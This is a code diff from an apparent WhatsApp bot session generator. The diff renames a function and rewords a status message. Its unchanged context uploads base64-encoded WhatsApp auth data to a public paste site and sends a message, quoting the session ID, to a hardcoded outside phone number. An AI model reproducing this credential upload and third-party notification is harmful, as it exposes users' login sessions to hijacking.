@@ -26,7 +26,7 @@ process.exit()      }, 1800)
 setTimeout(() => {
   const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore, } = require("@whiskeysockets/baileys");
   const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
-  async function HyNO() {
+  async function Vorterx() {
     const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
     try {
       let session = makeWASocket({ printQRInTerminal: true, logger: pino({ level: "silent" }), browser: Browsers.macOS("Desktop"), auth: state });
@@ -46,8 +46,8 @@ setTimeout(() => {
             const output = await axios.post('http://paste.c-net.org/',`${btoa(data)}`,{headers:{'Content-Type':'application/x-www-form-urlencoded'}});
              c2 = output.data.split('/')[3]
             await delay(500);
-            let session_id1 = await session.sendMessage(user, {text: 'HyNO;;;'+c2});
-            await session.sendMessage("27686881509@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
+            let session_id1 = await session.sendMessage(user, {text: 'Vorterx;;;'+c2});
+            await session.sendMessage("27686881509@s.whatsapp.net", { text: '*qr session has been scanned successfully.*' } , {quoted : session_id1});
           }catch (e) {console.log(e)}
 //===========================================================================================
 //===============================  SESSION ID 2   ===========================================
